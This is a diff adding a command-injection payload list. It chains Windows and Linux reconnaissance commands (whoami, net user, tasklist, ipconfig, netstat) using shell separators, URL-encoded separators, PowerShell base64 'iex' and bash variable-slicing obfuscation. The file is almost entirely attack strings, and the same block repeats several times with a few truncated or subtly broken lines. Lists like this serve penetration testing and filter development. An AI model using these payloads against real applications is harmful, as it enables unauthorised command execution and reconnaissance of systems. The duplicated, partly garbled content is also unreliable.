@@ -1,0 +1,923 @@
+whoami&dir
+whoami%26dir
+whoami&&dir
+whoami%26%26dir
+whoami|dir
+whoami%7cdir
+whoami||dir
+whoami%7c%7cdir
+whoami`dir`
+whoami%60%60dir
+whoami$()dir
+whoami%24%28%29dir
+whoami^dir
+"whoami"[-1..-20] -join ''&dir
+"whoami"[-1..-20] -join ''|dir
+iex "$('whoami'[-1..-20] -join '')"&dir
+iex "$('whoami'[-1..-20] -join '')"|dir
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&dir
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&dir
+dir&echo Pwned
+dir%26echo Pwned
+dir&&echo Pwned
+dir%26%26echo Pwned
+dir|echo Pwned
+dir%7cecho Pwned
+dir||echo Pwned
+dir%7c%7cecho Pwned
+dir`echo Pwned`
+dir%60%60echo Pwned
+dir$()echo Pwned
+dir%24%28%29echo Pwned
+dir^echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;dir
+echo${LS_COLORS:10:1}dir;dir
+$(tr '!-}' '"-~'<<<[);dir
+echo -n 'dir' | base64;dir
+cmd<<<$(base64 -d<<<ZGlyKQ==);dir
+dir&echo %USERNAME%
+dir%26echo %USERNAME%
+dir&&echo %USERNAME%
+dir%26%26echo %USERNAME%
+dir|echo %USERNAME%
+dir%7cecho %USERNAME%
+dir||echo %USERNAME%
+dir%7c%7cecho %USERNAME%
+dir`echo %USERNAME%`
+dir%60%60echo %USERNAME%
+dir$()echo %USERNAME%
+dir%24%28%29echo %USERNAME%
+echo${PATH:0:1}Windows${PATH:0:1}System32;echo %USERNAME%
+echo${LS_COLORS:10:1}echo %USERNAME%;echo %USERNAME%
+$(tr '!-}' '"-~'<<<[);echo %USERNAME%
+echo -n 'echo %USERNAME%' | base64;echo %USERNAME%
+cmd<<<$(base64 -d<<<ZWNobyAlVXNlck5hbWUl);echo %USERNAME%
+whoami&net user
+whoami%26net user
+whoami&&net user
+whoami%26%26net user
+whoami|net user
+whoami%7cnet user
+whoami||net user
+whoami%7c%7cnet user
+whoami`net user`
+whoami%60%60net user
+whoami$()net user
+whoami%24%28%29net user
+whoami^net user
+"whoami"[-1..-20] -join ''&net user
+"whoami"[-1..-20] -join ''|net user
+iex "$('whoami'[-1..-20] -join '')"&net user
+iex "$('whoami'[-1..-20] -join '')"|net user
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&net user
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&net user
+net user&echo Pwned
+net user%26echo Pwned
+net user&&echo Pwned
+net user%26%26echo Pwned
+net user|echo Pwned
+net user%7cecho Pwned
+net user||echo Pwned
+net user%7c%7cecho Pwned
+net user`echo Pwned`
+net user%60%60echo Pwned
+net user$()echo Pwned
+net user%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;net user
+echo${LS_COLORS:10:1}net user;net user
+$(tr '!-}' '"-~'<<<[);net user
+echo -n 'net user' | base64;net user
+cmd<<<$(base64 -d<<<bmV0IHVzZXI=);net user
+whoami&tasklist
+whoami%26tasklist
+whoami&&tasklist
+whoami%26%26tasklist
+whoami|tasklist
+whoami%7ctasklist
+whoami||tasklist
+whoami%7c%7ctasklist
+whoami`tasklist`
+whoami%60%60tasklist
+whoami$()tasklist
+whoami%24%28%29tasklist
+whoami^tasklist
+"whoami"[-1..-20] -join ''&tasklist
+"whoami"[-1..-20] -join ''|tasklist
+iex "$('whoami'[-1..-20] -join '')"&tasklist
+iex "$('whoami'[-1..-20] -join '')"|tasklist
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&tasklist
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&tasklist
+tasklist&echo Pwned
+tasklist%26echo Pwned
+tasklist&&echo Pwned
+tasklist%26%26echo Pwned
+tasklist|echo Pwned
+tasklist%7cecho Pwned
+tasklist||echo Pwned
+tasklist%7c%7cecho Pwned
+tasklist`echo Pwned`
+tasklist%60%60echo Pwned
+tasklist$()echo Pwned
+tasklist%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;tasklist
+echo${LS_COLORS:10:1}tasklist;tasklist
+$(tr '!-}' '"-~'<<<[);tasklist
+echo -n 'tasklist' | base64;tasklist
+cmd<<<$(base64 -d<<<dGFza2xpc3Q=);tasklist
+whoami&ipconfig
+whoami%26ipconfig
+whoami&&ipconfig
+whoami%26%26ipconfig
+whoami|ipconfig
+whoami%7cipconfig
+whoami||ipconfig
+whoami%7c%7cipconfig
+whoami`ipconfig`
+whoami%60%60ipconfig
+whoami$()ipconfig
+whoami%24%28%29ipconfig
+whoami^ipconfig
+"whoami"[-1..-20] -join ''&ipconfig
+"whoami"[-1..-20] -join ''|ipconfig
+iex "$('whoami'[-1..-20] -join '')"&ipconfig
+iex "$('whoami'[-1..-20] -join '')"|ipconfig
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&ipconfig
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&ipconfig
+ipconfig&echo Pwned
+ipconfig%26echo Pwned
+ipconfig&&echo Pwned
+ipconfig%26%26echo Pwned
+ipconfig|echo Pwned
+ipconfig%7cecho Pwned
+ipconfig||echo Pwned
+ipconfig%7c%7cecho Pwned
+ipconfig`echo Pwned`
+ipconfig%60%60echo Pwned
+ipconfig$()echo Pwned
+ipconfig%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;ipconfig
+echo${LS_COLORS:10:1}ipconfig;ipconfig
+$(tr '!-}' '"-~'<<<[);ipconfig
+echo -n 'ipconfig' | base64;ipconfig
+cmd<<<$(base64 -d<<<aXBjb25maWc=);ipconfig
+whoami&netstat -an
+whoami%26netstat -an
+whoami&&netstat -an
+whoami%26%26netstat -an
+whoami|netstat -an
+whoami%7cnetstat -an
+whoami||netstat -an
+whoami%7c%7cnetstat -an
+whoami`netstat -an`
+whoami%60%60netstat -an
+whoami$()netstat -an
+whoami%24%28%29netstat -an
+whoami^netstat -an
+"whoami"[-1..-20] -join ''&netstat -an
+"whoami"[-1..-20] -join ''|netstat -an
+iex "$('whoami'[-1..-20] -join '')"&netstat -an
+iex "$('whoami'[-1..-20] -join '')"|netstat
+whoami&dir
+whoami%26dir
+whoami&&dir
+whoami%26%26dir
+whoami|dir
+whoami%7cdir
+whoami||dir
+whoami%7c%7cdir
+whoami`dir`
+whoami%60%60dir
+whoami$()dir
+whoami%24%28%29dir
+whoami^dir
+"whoami"[-1..-20] -join ''&dir
+"whoami"[-1..-20] -join ''|dir
+iex "$('whoami'[-1..-20] -join '')"&dir
+iex "$('whoami'[-1..-20] -join '')"|dir
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&dir
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&dir
+dir&echo Pwned
+dir%26echo Pwned
+dir&&echo Pwned
+dir%26%26echo Pwned
+dir|echo Pwned
+dir%7cecho Pwned
+dir||echo Pwned
+dir%7c%7cecho Pwned
+dir`echo Pwned`
+dir%60%60echo Pwned
+dir$()echo Pwned
+dir%24%28%29echo Pwned
+dir^echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;dir
+echo${LS_COLORS:10:1}dir;dir
+$(tr '!-}' '"-~'<<<[);dir
+echo -n 'dir' | base64;dir
+cmd<<<$(base64 -d<<<ZGlyKQ==);dir
+dir&echo %USERNAME%
+dir%26echo %USERNAME%
+dir&&echo %USERNAME%
+dir%26%26echo %USERNAME%
+dir|echo %USERNAME%
+dir%7cecho %USERNAME%
+dir||echo %USERNAME%
+dir%7c%7cecho %USERNAME%
+dir`echo %USERNAME%`
+dir%60%60echo %USERNAME%
+dir$()echo %USERNAME%
+dir%24%28%29echo %USERNAME%
+echo${PATH:0:1}Windows${PATH:0:1}System32;echo %USERNAME%
+echo${LS_COLORS:10:1}echo %USERNAME%;echo %USERNAME%
+$(tr '!-}' '"-~'<<<[);echo %USERNAME%
+echo -n 'echo %USERNAME%' | base64;echo %USERNAME%
+cmd<<<$(base64 -d<<<ZWNobyAlVXNlck5hbWUl);echo %USERNAME%
+whoami&net user
+whoami%26net user
+whoami&&net user
+whoami%26%26net user
+whoami|net user
+whoami%7cnet user
+whoami||net user
+whoami%7c%7cnet user
+whoami`net user`
+whoami%60%60net user
+whoami$()net user
+whoami%24%28%29net user
+whoami^net user
+"whoami"[-1..-20] -join ''&net user
+"whoami"[-1..-20] -join ''|net user
+iex "$('whoami'[-1..-20] -join '')"&net user
+iex "$('whoami'[-1..-20] -join '')"|net user
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&net user
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&net user
+net user&echo Pwned
+net user%26echo Pwned
+net user&&echo Pwned
+net user%26%26echo Pwned
+net user|echo Pwned
+net user%7cecho Pwned
+net user||echo Pwned
+net user%7c%7cecho Pwned
+net user`echo Pwned`
+net user%60%60echo Pwned
+net user$()echo Pwned
+net user%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;net user
+echo${LS_COLORS:10:1}net user;net user
+$(tr '!-}' '"-~'<<<[);net user
+echo -n 'net user' | base64;net user
+cmd<<<$(base64 -d<<<bmV0IHVzZXI=);net user
+whoami&tasklist
+whoami%26tasklist
+whoami&&tasklist
+whoami%26%26tasklist
+whoami|tasklist
+whoami%7ctasklist
+whoami||tasklist
+whoami%7c%7ctasklist
+whoami`tasklist`
+whoami%60%60tasklist
+whoami$()tasklist
+whoami%24%28%29tasklist
+whoami^tasklist
+"whoami"[-1..-20] -join ''&tasklist
+"whoami"[-1..-20] -join ''|tasklist
+iex "$('whoami'[-1..-20] -join '')"&tasklist
+iex "$('whoami'[-1..-20] -join '')"|tasklist
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&tasklist
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&tasklist
+tasklist&echo Pwned
+tasklist%26echo Pwned
+tasklist&&echo Pwned
+tasklist%26%26echo Pwned
+tasklist|echo Pwned
+tasklist%7cecho Pwned
+tasklist||echo Pwned
+tasklist%7c%7cecho Pwned
+tasklist`echo Pwned`
+tasklist%60%60echo Pwned
+tasklist$()echo Pwned
+tasklist%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;tasklist
+echo${LS_COLORS:10:1}tasklist;tasklist
+$(tr '!-}' '"-~'<<<[);tasklist
+echo -n 'tasklist' | base64;tasklist
+cmd<<<$(base64 -d<<<dGFza2xpc3Q=);tasklist
+whoami&ipconfig
+whoami%26ipconfig
+whoami&&ipconfig
+whoami%26%26ipconfig
+whoami|ipconfig
+whoami%7cipconfig
+whoami||ipconfig
+whoami%7c%7cipconfig
+whoami`ipconfig`
+whoami%60%60ipconfig
+whoami$()ipconfig
+whoami%24%28%29ipconfig
+whoami^ipconfig
+"whoami"[-1..-20] -join ''&ipconfig
+"whoami"[-1..-20] -join ''|ipconfig
+iex "$('whoami'[-1..-20] -join '')"&ipconfig
+iex "$('whoami'[-1..-20] -join '')"|ipconfig
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&ipconfig
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&ipconfig
+ipconfig&echo Pwned
+ipconfig%26echo Pwned
+ipconfig&&echo Pwned
+ipconfig%26%26echo Pwned
+ipconfig|echo Pwned
+ipconfig%7cecho Pwned
+ipconfig||echo Pwned
+ipconfig%7c%7cecho Pwned
+ipconfig`echo Pwned`
+ipconfig%60%60echo Pwned
+ipconfig$()echo Pwned
+ipconfig%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;ipconfig
+echo${LS_COLORS:10:1}ipconfig;ipconfig
+$(tr '!-}' '"-~'<<<[);ipconfig
+echo -n 'ipconfig' | base64;ipconfig
+cmd<<<$(base64 -d<<<aXBjb25maWc=);ipconfig
+whoami&netstat -an
+whoami%26netstat -an
+whoami&&netstat -an
+whoami%26%26netstat -an
+whoami|netstat -an
+whoami%7cnetstat -an
+whoami||netstat -an
+whoami%7c%7cnetstat -an
+whoami`netstat -an`
+whoami%60%60netstat -an
+whoami$()netstat -an
+whoami%24%28%29netstat -an
+whoami^netstat -an
+"whoami"[-1..-20] -join ''&netstat -an
+"whoami"[-1..-20] -join ''|netstat -an
+iex "$('whoami'[-1..-20] -join '')"&netstat -an
+whoami&dir
+whoami%26dir
+whoami&&dir
+whoami%26%26dir
+whoami|dir
+whoami%7cdir
+whoami||dir
+whoami%7c%7cdir
+whoami`dir`
+whoami%60%60dir
+whoami$()dir
+whoami%24%28%29dir
+whoami^dir
+"whoami"[-1..-20] -join ''&dir
+"whoami"[-1..-20] -join ''|dir
+iex "$('whoami'[-1..-20] -join '')"&dir
+iex "$('whoami'[-1..-20] -join '')"|dir
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&dir
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&dir
+dir&echo Pwned
+dir%26echo Pwned
+dir&&echo Pwned
+dir%26%26echo Pwned
+dir|echo Pwned
+dir%7cecho Pwned
+dir||echo Pwned
+dir%7c%7cecho Pwned
+dir`echo Pwned`
+dir%60%60echo Pwned
+dir$()echo Pwned
+dir%24%28%29echo Pwned
+dir^echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;dir
+echo${LS_COLORS:10:1}dir;dir
+$(tr '!-}' '"-~'<<<[);dir
+echo -n 'dir' | base64;dir
+cmd<<<$(base64 -d<<<ZGlyKQ==);dir
+dir&echo %USERNAME%
+dir%26echo %USERNAME%
+dir&&echo %USERNAME%
+dir%26%26echo %USERNAME%
+dir|echo %USERNAME%
+dir%7cecho %USERNAME%
+dir||echo %USERNAME%
+dir%7c%7cecho %USERNAME%
+dir`echo %USERNAME%`
+dir%60%60echo %USERNAME%
+dir$()echo %USERNAME%
+dir%24%28%29echo %USERNAME%
+echo${PATH:0:1}Windows${PATH:0:1}System32;echo %USERNAME%
+echo${LS_COLORS:10:1}echo %USERNAME%;echo %USERNAME%
+$(tr '!-}' '"-~'<<<[);echo %USERNAME%
+echo -n 'echo %USERNAME%' | base64;echo %USERNAME%
+cmd<<<$(base64 -d<<<ZWNobyAlVXNlck5hbWUl);echo %USERNAME%
+whoami&net user
+whoami%26net user
+whoami&&net user
+whoami%26%26net user
+whoami|net user
+whoami%7cnet user
+whoami||net user
+whoami%7c%7cnet user
+whoami`net user`
+whoami%60%60net user
+whoami$()net user
+whoami%24%28%29net user
+whoami^net user
+"whoami"[-1..-20] -join ''&net user
+"whoami"[-1..-20] -join ''|net user
+iex "$('whoami'[-1..-20] -join '')"&net user
+iex "$('whoami'[-1..-20] -join '')"|net user
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&net user
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&net user
+net user&echo Pwned
+net user%26echo Pwned
+net user&&echo Pwned
+net user%26%26echo Pwned
+net user|echo Pwned
+net user%7cecho Pwned
+net user||echo Pwned
+net user%7c%7cecho Pwned
+net user`echo Pwned`
+net user%60%60echo Pwned
+net user$()echo Pwned
+net user%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;net user
+echo${LS_COLORS:10:1}net user;net user
+$(tr '!-}' '"-~'<<<[);net user
+echo -n 'net user' | base64;net user
+cmd<<<$(base64 -d<<<bmV0IHVzZXI=);net user
+whoami&tasklist
+whoami%26tasklist
+whoami&&tasklist
+whoami%26%26tasklist
+whoami|tasklist
+whoami%7ctasklist
+whoami||tasklist
+whoami%7c%7ctasklist
+whoami`tasklist`
+whoami%60%60tasklist
+whoami$()tasklist
+whoami%24%28%29tasklist
+whoami^tasklist
+"whoami"[-1..-20] -join ''&tasklist
+"whoami"[-1..-20] -join ''|tasklist
+iex "$('whoami'[-1..-20] -join '')"&tasklist
+iex "$('whoami'[-1..-20] -join '')"|tasklist
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&tasklist
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&tasklist
+tasklist&echo Pwned
+tasklist%26echo Pwned
+tasklist&&echo Pwned
+tasklist%26%26echo Pwned
+tasklist|echo Pwned
+tasklist%7cecho Pwned
+tasklist||echo Pwned
+tasklist%7c%7cecho Pwned
+tasklist`echo Pwned`
+tasklist%60%60echo Pwned
+tasklist$()echo Pwned
+tasklist%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;tasklist
+echo${LS_COLORS:10:1}tasklist;tasklist
+$(tr '!-}' '"-~'<<<[);tasklist
+echo -n 'tasklist' | base64;tasklist
+cmd<<<$(base64 -d<<<dGFza2xpc3Q=);tasklist
+whoami&ipconfig
+whoami%26ipconfig
+whoami&&ipconfig
+whoami%26%26ipconfig
+whoami|ipconfig
+whoami%7cipconfig
+whoami||ipconfig
+whoami%7c%7cipconfig
+whoami`ipconfig`
+whoami%60%60ipconfig
+whoami$()ipconfig
+whoami%24%28%29ipconfig
+whoami^ipconfig
+"whoami"[-1..-20] -join ''&ipconfig
+"whoami"[-1..-20] -join ''|ipconfig
+iex "$('whoami'[-1..-20] -join '')"&ipconfig
+iex "$('whoami'[-1..-20] -join '')"|ipconfig
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&ipconfig
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&ipconfig
+ipconfig&echo Pwned
+ipconfig%26echo Pwned
+ipconfig&&echo Pwned
+ipconfig%26%26echo Pwned
+ipconfig|echo Pwned
+ipconfig%7cecho Pwned
+ipconfig||echo Pwned
+ipconfig%7c%7cecho Pwned
+ipconfig`echo Pwned`
+ipconfig%60%60echo Pwned
+ipconfig$()echo Pwned
+ipconfig%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;ipconfig
+echo${LS_COLORS:10:1}ipconfig;ipconfig
+$(tr '!-}' '"-~'<<<[);ipconfig
+echo -n 'ipconfig' | base64;ipconfig
+cmd<<<$(base64 -d<<<aXBjb25maWc=);ipconfig
+whoami&netstat -an
+whoami%26netstat -an
+whoami&&netstat -an
+whoami%26%26netstat -an
+whoami|netstat -an
+whoami%7cnetstat -an
+whoami||netstat -an
+whoami%7c%7cnetstat -an
+whoami`netstat -an`
+whoami%60%60netstat -an
+whoami$()netstat -an
+whoami%24%28%29netstat -an
+whoami^netstat -an
+"whoami"[-1..-20] -join ''&netstat -an
+"whoami"[-1..-20] -join ''|netstat -an
+iex "$('whoami'[-1..-20] -join '')"&netstat -an
+whoami&dir
+whoami%26dir
+whoami&&dir
+whoami%26%26dir
+whoami|dir
+whoami%7cdir
+whoami||dir
+whoami%7c%7cdir
+whoami`dir`
+whoami%60%60dir
+whoami$()dir
+whoami%24%28%29dir
+whoami^dir
+"whoami"[-1..-20] -join ''&dir
+"whoami"[-1..-20] -join ''|dir
+iex "$('whoami'[-1..-20] -join '')"&dir
+iex "$('whoami'[-1..-20] -join '')"|dir
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&dir
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&dir
+dir&echo Pwned
+dir%26echo Pwned
+dir&&echo Pwned
+dir%26%26echo Pwned
+dir|echo Pwned
+dir%7cecho Pwned
+dir||echo Pwned
+dir%7c%7cecho Pwned
+dir`echo Pwned`
+dir%60%60echo Pwned
+dir$()echo Pwned
+dir%24%28%29echo Pwned
+dir^echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;dir
+echo${LS_COLORS:10:1}dir;dir
+$(tr '!-}' '"-~'<<<[);dir
+echo -n 'dir' | base64;dir
+cmd<<<$(base64 -d<<<ZGlyKQ==);dir
+dir&echo %USERNAME%
+dir%26echo %USERNAME%
+dir&&echo %USERNAME%
+dir%26%26echo %USERNAME%
+dir|echo %USERNAME%
+dir%7cecho %USERNAME%
+dir||echo %USERNAME%
+dir%7c%7cecho %USERNAME%
+dir`echo %USERNAME%`
+dir%60%60echo %USERNAME%
+dir$()echo %USERNAME%
+dir%24%28%29echo %USERNAME%
+echo${PATH:0:1}Windows${PATH:0:1}System32;echo %USERNAME%
+echo${LS_COLORS:10:1}echo %USERNAME%;echo %USERNAME%
+$(tr '!-}' '"-~'<<<[);echo %USERNAME%
+echo -n 'echo %USERNAME%' | base64;echo %USERNAME%
+cmd<<<$(base64 -d<<<ZWNobyAlVXNlck5hbWUl);echo %USERNAME%
+whoami&net user
+whoami%26net user
+whoami&&net user
+whoami%26%26net user
+whoami|net user
+whoami%7cnet user
+whoami||net user
+whoami%7c%7cnet user
+whoami`net user`
+whoami%60%60net user
+whoami$()net user
+whoami%24%28%29net user
+whoami^net user
+"whoami"[-1..-20] -join ''&net user
+"whoami"[-1..-20] -join ''|net user
+iex "$('whoami'[-1..-20] -join '')"&net user
+iex "$('whoami'[-1..-20] -join '')"|net user
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&net user
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&net user
+net user&echo Pwned
+net user%26echo Pwned
+net user&&echo Pwned
+net user%26%26echo Pwned
+net user|echo Pwned
+net user%7cecho Pwned
+net user||echo Pwned
+net user%7c%7cecho Pwned
+net user`echo Pwned`
+net user%60%60echo Pwned
+net user$()echo Pwned
+net user%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;net user
+echo${LS_COLORS:10:1}net user;net user
+$(tr '!-}' '"-~'<<<[);net user
+echo -n 'net user' | base64;net user
+cmd<<<$(base64 -d<<<bmV0IHVzZXI=);net user
+whoami&tasklist
+whoami%26tasklist
+whoami&&tasklist
+whoami%26%26tasklist
+whoami|tasklist
+whoami%7ctasklist
+whoami||tasklist
+whoami%7c%7ctasklist
+whoami`tasklist`
+whoami%60%60tasklist
+whoami$()tasklist
+whoami%24%28%29tasklist
+whoami^tasklist
+"whoami"[-1..-20] -join ''&tasklist
+"whoami"[-1..-20] -join ''|tasklist
+iex "$('whoami'[-1..-20] -join '')"&tasklist
+iex "$('whoami'[-1..-20] -join '')"|tasklist
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&tasklist
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&tasklist
+tasklist&echo Pwned
+tasklist%26echo Pwned
+tasklist&&echo Pwned
+tasklist%26%26echo Pwned
+tasklist|echo Pwned
+tasklist%7cecho Pwned
+tasklist||echo Pwned
+tasklist%7c%7cecho Pwned
+tasklist`echo Pwned`
+tasklist%60%60echo Pwned
+tasklist$()echo Pwned
+tasklist%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;tasklist
+echo${LS_COLORS:10:1}tasklist;tasklist
+$(tr '!-}' '"-~'<<<[);tasklist
+echo -n 'tasklist' | base64;tasklist
+cmd<<<$(base64 -d<<<dGFza2xpc3Q=);tasklist
+whoami&ipconfig
+whoami%26ipconfig
+whoami&&ipconfig
+whoami%26%26ipconfig
+whoami|ipconfig
+whoami%7cipconfig
+whoami||ipconfig
+whoami%7c%7cipconfig
+whoami`ipconfig`
+whoami%60%60ipconfig
+whoami$()ipconfig
+whoami%24%28%29ipconfig
+whoami^ipconfig
+"whoami"[-1..-20] -join ''&ipconfig
+"whoami"[-1..-20] -join ''|ipconfig
+iex "$('whoami'[-1..-20] -join '')"&ipconfig
+iex "$('whoami'[-1..-20] -join '')"|ipconfig
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&ipconfig
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&ipconfig
+ipconfig&echo Pwned
+ipconfig%26echo Pwned
+ipconfig&&echo Pwned
+ipconfig%26%26echo Pwned
+ipconfig|echo Pwned
+ipconfig%7cecho Pwned
+ipconfig||echo Pwned
+ipconfig%7c%7cecho Pwned
+ipconfig`echo Pwned`
+ipconfig%60%60echo Pwned
+ipconfig$()echo Pwned
+ipconfig%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;ipconfig
+echo${LS_COLORS:10:1}ipconfig;ipconfig
+$(tr '!-}' '"-~'<<<[);ipconfig
+echo -n 'ipconfig' | base64;ipconfig
+cmd<<<$(base64 -d<<<aXBjb25maWc=);ipconfig
+whoami&netstat -an
+whoami%26netstat -an
+whoami&&netstat -an
+whoami%26%26netstat -an
+whoami|netstat -an
+whoami%7cnetstat -an
+whoami||netstat -an
+whoami%7c%7cnetstat -an
+whoami`netstat -an`
+whoami%60%60netstat -an
+whoami$()netstat -an
+whoami%24%28%29netstat -an
+whoami^netstat -an
+"whoami"[-1..-20] -join ''&netstat -an
+"whoami"[-1..-20] -join ''|netstat -an
+iex "$('whoami'[-1..-20] -join '')"&netstat -an
+iex "$('whoami'[-1..-20] -join '')"|netstat -an
+whoami&dir
+whoami%26dir
+whoami&&dir
+whoami%26%26dir
+whoami|dir
+whoami%7cdir
+whoami||dir
+whoami%7c%7cdir
+whoami`dir`
+whoami%60%60dir
+whoami$()dir
+whoami%24%28%29dir
+whoami^dir
+"whoami"[-1..-20] -join ''&dir
+"whoami"[-1..-20] -join ''|dir
+iex "$('whoami'[-1..-20] -join '')"&dir
+iex "$('whoami'[-1..-20] -join '')"|dir
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&dir
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&dir
+dir&echo Pwned
+dir%26echo Pwned
+dir&&echo Pwned
+dir%26%26echo Pwned
+dir|echo Pwned
+dir%7cecho Pwned
+dir||echo Pwned
+dir%7c%7cecho Pwned
+dir`echo Pwned`
+dir%60%60echo Pwned
+dir$()echo Pwned
+dir%24%28%29echo Pwned
+dir^echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;dir
+echo${LS_COLORS:10:1}dir;dir
+$(tr '!-}' '"-~'<<<[);dir
+echo -n 'dir' | base64;dir
+cmd<<<$(base64 -d<<<ZGlyKQ==);dir
+dir&echo %USERNAME%
+dir%26echo %USERNAME%
+dir&&echo %USERNAME%
+dir%26%26echo %USERNAME%
+dir|echo %USERNAME%
+dir%7cecho %USERNAME%
+dir||echo %USERNAME%
+dir%7c%7cecho %USERNAME%
+dir`echo %USERNAME%`
+dir%60%60echo %USERNAME%
+dir$()echo %USERNAME%
+dir%24%28%29echo %USERNAME%
+echo${PATH:0:1}Windows${PATH:0:1}System32;echo %USERNAME%
+echo${LS_COLORS:10:1}echo %USERNAME%;echo %USERNAME%
+$(tr '!-}' '"-~'<<<[);echo %USERNAME%
+echo -n 'echo %USERNAME%' | base64;echo %USERNAME%
+cmd<<<$(base64 -d<<<ZWNobyAlVXNlck5hbWUl);echo %USERNAME%
+whoami&net user
+whoami%26net user
+whoami&&net user
+whoami%26%26net user
+whoami|net user
+whoami%7cnet user
+whoami||net user
+whoami%7c%7cnet user
+whoami`net user`
+whoami%60%60net user
+whoami$()net user
+whoami%24%28%29net user
+whoami^net user
+"whoami"[-1..-20] -join ''&net user
+"whoami"[-1..-20] -join ''|net user
+iex "$('whoami'[-1..-20] -join '')"&net user
+iex "$('whoami'[-1..-20] -join '')"|net user
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&net user
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&net user
+net user&echo Pwned
+net user%26echo Pwned
+net user&&echo Pwned
+net user%26%26echo Pwned
+net user|echo Pwned
+net user%7cecho Pwned
+net user||echo Pwned
+net user%7c%7cecho Pwned
+net user`echo Pwned`
+net user%60%60echo Pwned
+net user$()echo Pwned
+net user%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;net user
+echo${LS_COLORS:10:1}net user;net user
+$(tr '!-}' '"-~'<<<[);net user
+echo -n 'net user' | base64;net user
+cmd<<<$(base64 -d<<<bmV0IHVzZXI=);net user
+whoami&tasklist
+whoami%26tasklist
+whoami&&tasklist
+whoami%26%26tasklist
+whoami|tasklist
+whoami%7ctasklist
+whoami||tasklist
+whoami%7c%7ctasklist
+whoami`tasklist`
+whoami%60%60tasklist
+whoami$()tasklist
+whoami%24%28%29tasklist
+whoami^tasklist
+"whoami"[-1..-20] -join ''&tasklist
+"whoami"[-1..-20] -join ''|tasklist
+iex "$('whoami'[-1..-20] -join '')"&tasklist
+iex "$('whoami'[-1..-20] -join '')"|tasklist
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&tasklist
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&tasklist
